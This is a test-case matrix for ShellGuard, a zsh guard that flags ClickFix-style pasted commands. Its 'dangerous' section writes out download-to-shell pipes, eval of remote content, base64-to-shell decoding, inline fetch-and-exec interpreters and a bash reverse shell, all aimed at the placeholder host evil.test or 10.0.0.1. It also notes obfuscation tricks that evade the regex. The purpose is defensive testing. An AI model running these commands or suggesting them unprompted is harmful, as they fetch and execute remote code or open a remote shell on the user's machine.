# ShellGuard — Test Cases

The detection regex is verified against the matrix below. Every "DANGEROUS" line
must trigger the warning + confirmation gate; every "SAFE" line must run with no
prompt. All examples use the obvious placeholder host `evil.test` — none are real
payloads, and nothing here downloads or executes anything.

You can re-run this matrix yourself; see [Reproduce](#reproduce) at the bottom.

---

## DANGEROUS — must trigger the guard

These are the ClickFix-style "paste this to verify you're human" payloads.

```sh
# 1) Download piped straight into a shell / interpreter
curl https://evil.test/x.sh | sh
curl -fsSL https://evil.test/install | bash
wget -qO- http://evil.test/p | sudo bash
fetch -o - https://evil.test/a | zsh
curl https://evil.test/p | python3
curl https://evil.test/p | perl
curl https://evil.test/p | ruby
curl https://evil.test/p | node

# 2) eval / exec / source of a remote command substitution
eval "$(curl -s https://evil.test/z)"
exec $(wget -qO- https://evil.test/z)
source <(curl -s https://evil.test/z)   # note: see edge cases below
. "$(curl -s https://evil.test/z)"

# 3) base64 decode piped into a shell
echo aGVsbG8 | base64 -d | sh
base64 --decode payload.txt | bash
cat blob.b64 | base64 -D | zsh

# 4) long base64 blob handed to base64 / a shell
echo TUFMSUNJT1VTQkFTRTY0QkxPQkxPTkdFTk9VR0hUT1RSSUdHRVI= | base64 -d

# 5) inline interpreter that fetches + executes
python3 -c "import urllib.request,os; exec(urllib.request.urlopen('http://evil.test').read())"
python  -c "import os; os.system('curl http://evil.test | sh')"
perl    -e "system('curl http://evil.test | sh')"

# 6) remote content piped into osascript (AMOS fake-password vector)
curl https://evil.test/x | osascript

# 7) osascript output piped into a shell
osascript -e 'do shell script "echo hi"' | bash

# 8) bash reverse-shell redirect
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

---

## SAFE — must NOT trigger the guard

Ordinary, everyday commands. If any of these prompt, that's a false positive —
add the relevant host to `CLICKFIX_GUARD_ALLOW_HOSTS` or report it.

```sh
# curl/wget that DOWNLOAD but don't pipe to a shell
curl https://api.github.com/repos/foo/bar
curl -O https://example.com/file.tar.gz
curl -fsSL https://example.com/data.json -o data.json
wget https://example.com/archive.zip

# git, package managers, normal pipelines
git clone https://github.com/foo/bar.git
brew install wget
npm run build | tee log.txt
ls -la | sort | head
cat access.log | grep 404 | wc -l

# base64 used normally (encoding, not decode-to-shell)
cat file | base64
echo "hello world" | base64

# python/node/ruby running ordinary code
python3 -c "print(1+1)"
node -e "console.log(2+2)"

# the words "curl"/"bash" appearing in a string, not as a pipeline
echo "curl this is just a sentence about bash"

# ssh, docker, interactive shells
ssh user@host
docker run -it ubuntu bash
```

---

## Allowlisted installers — flagged shape, but trusted host → SILENT pass

These have the dangerous `… | sh` shape, but every URL points at a trusted
installer host in the default allowlist, so ShellGuard stays quiet. (You can
still inspect them yourself; trust is a convenience, not a guarantee.)

```sh
curl https://sh.rustup.rs | sh                       # rustup
curl -fsSL https://get.docker.com | sh               # docker
curl https://install.python-poetry.org | python3     # poetry
curl -fsSL https://get.pnpm.io/install.sh | sh       # pnpm
```

A command mixing a trusted host **and** an untrusted host still prompts — one
untrusted download is enough:

```sh
curl https://sh.rustup.rs/a | sh; curl https://evil.test/b | sh   # PROMPTS
```

---

## Edge cases & known limits

- **Process substitution** `source <(curl …)` / `bash <(curl …)` is caught by a
  dedicated rule. Unusual quoting can still vary; the load-bearing case
  (`curl | sh`) is always caught.
- **Heavily obfuscated one-liners** (e.g. variable-built command names,
  `$'\x73\x68'` for `sh`) can evade a static regex. No grammar-based guard is a
  complete defense against a motivated, hand-crafted bypass — ShellGuard targets
  the high-volume copy-paste ClickFix payloads, which are not obfuscated because
  the victim has to paste them verbatim.
- **Non-zsh shells** are not protected — ShellGuard hooks the zsh line editor only.
- **Scripts** run their commands without going through the interactive prompt, so
  the guard does not see them. This is by design (it's an interactive paste guard).

---

## Reproduce

The repo author verified this matrix in a real interactive zsh (via `expect`)
covering: banner shown on danger, Enter aborts cleanly, typing the phrase confirms
and runs, and safe commands pass with no prompt. To spot-check the detection regex
yourself without binding any widgets, source the guard and test the master regex:

```zsh
source ./shellguard.zsh
buf='curl https://evil.test/x.sh | sh'
[[ $buf =~ $_clickfix_master_re ]] && echo "FLAGGED" || echo "safe"
```
